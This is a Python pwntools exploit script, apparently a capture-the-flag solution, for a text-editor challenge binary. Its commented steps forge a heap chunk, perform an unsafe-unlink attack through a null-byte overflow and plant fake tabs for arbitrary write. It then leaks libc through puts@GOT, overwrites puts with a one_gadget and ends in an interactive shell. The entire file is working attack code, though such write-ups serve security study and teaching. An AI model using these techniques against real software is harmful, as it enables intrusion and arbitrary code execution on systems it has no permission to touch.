from pwn import *

context.update(os = "linux", arch = "amd64")
elf = context.binary = ELF("chall")
libc = ELF("libc.so.6")

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
else:
	p = elf.process()

# gdb.attach(p)
# pause()

def backspace(count):
	p.sendlineafter(b"> ", b"2")
	p.sendlineafter(b"? ", str(count).encode())

def new_tab(data):
	p.sendlineafter(b"> ", b"3")
	p.sendlineafter(b": ", data)

def select_tab(idx):
	p.sendlineafter(b"> ", b"4")
	p.sendlineafter(b": ", str(idx).encode())

def type_string(string):
	p.sendlineafter(b"> ", b"1")
	p.sendafter(b": ", string)

# the 'buffers' array that holds two String objects
buffers_ptrs = 0x4040e0

# a fake chunk that `unlink_chunk()` will be called on later to perform an unsafe unlink attack.
# fd and bk point to a bit before the pointer to this chunk stored in global memory in `buffers` array.
# we should add two 0 qwords after fd and bk to make fd_nextsize and bk_nextsize NULL to prevent
# `unlink_chunk()` from doing additional stuff that will segfault.
# The fake chunk is needed because the pointer in global memory points to the user data of the real chunk
# and not the beginning of the chunk. So because the fake chunk starts from the user data of the read chunk,
# the global pointer will point to the beginning of the fake chunk and not its user data.
fd = buffers_ptrs + 0x10
bk = buffers_ptrs + 0x18
fake_chunk = p64(0) + p64(0x451) + p64(fd) + p64(bk) + p64(0) * 2

# making our tab 0 buffer large enough so that after the next expansion it will have a size not
# fitting in tcache range.
type_string(b"A" * 0x2ff)

# creating a new tab to store our fake chunk that will be unlinked (tab 1)
new_tab(b"B" * 0x456)

# the `String_from_cstr` function doesn't let us enter payloads including null-bytes so we have
# to create the tab with some placeholder payload and then use backspace and typing characters to
# refill the tab with correct data. Here we are entering our fake chunk into tab 1.
backspace(0x457)
type_string(fake_chunk.ljust(0x450, b"B"))

# forcing tab 0 to double its size so that it doesn't fit in tcache any more.
# the new tab 0 chunk will be allocated after the current tab 1 chunk so we can write
# a null-byte into its chunksize by using the overflow in tab 1.
select_tab(0)
type_string(b"C" * (0x5f0 - 0x2ff))

# the size of tab 0 chunk will be changed from 0x611 to 0x600 so we need to
# write chunk size data for a fake next chunk at the end of it to prevent libc
# checks from aborting. Also, the content of the current chunk are copied to
# a large chunk allocated after this which contain AAAA... (0x414141...). Therefore,
# when checking the `PREV_INUSE` bit of the next chunk of the next chunk, it will be 1
# (0x4141414141414141 & 1) so there won't be any forward consolidation.
type_string(p64(0x71) * 2)

# writing the fake prev_size before the beginning of tab 0 chunk
# so that it will unlink our fake chunk instead of the actual tab 1
# chunk itself.
select_tab(1)
type_string(p64(0x450))

# triggering another expansion of the tab 0 buffer, which will cause it to
# free() the current tab 0 buffer (and thus unlink our fake chunk).
select_tab(0)
type_string(b"S")

# Now the unlink attack is done and tab 1 buffer pointer actually points to
# `buffers + 0x10`. However, because the current size of the tab 1 String object
# is rather large, the push/pop operations on it happen way after this location.
# we need to use backspace to reduce the length and overwrite the `tabs_count` variable
# in global memory so that we can select fake tabs.
select_tab(1)
backspace(0x430)
backspace(4)
select_tab(1)	# the last backspace overwrote the `current_tab` value with 0 so we fix it again.
backspace(4)
type_string(b"\x10")	# changing `tabs_count` to 16
type_string(b"\0" * 3)
select_tab(1)	# fix the `current_tab` value overwritten with a null-byte again
type_string(b"\x01")	# be careful not to change `current_tab` here as well.
type_string(b"\0" * 3)
type_string(p64(0) * 2)

# creating a fake tab with an arbitrary buffer pointer that gives us arbitrary write.
type_string(p64(0) + p64(0x1000) + p64(elf.got["puts"]))
select_tab(3)	# selecting our fake tab that now points to puts@got

# we get a libc leak when the content of the buffer at our fake tab is printed.
p.recvuntil(b"Current buffer: ")
libc_leak = u64(p.recvuntil(b"\n", drop = True).ljust(8, b"\0"))
libc.address = libc_leak - libc.sym["puts"]
log.success("libc @ " + hex(libc.address))

# replacing puts with a one_gadget in GOT
type_string(p64(libc.address + 0xebc85).rstrip(b"\0"))

p.interactive()
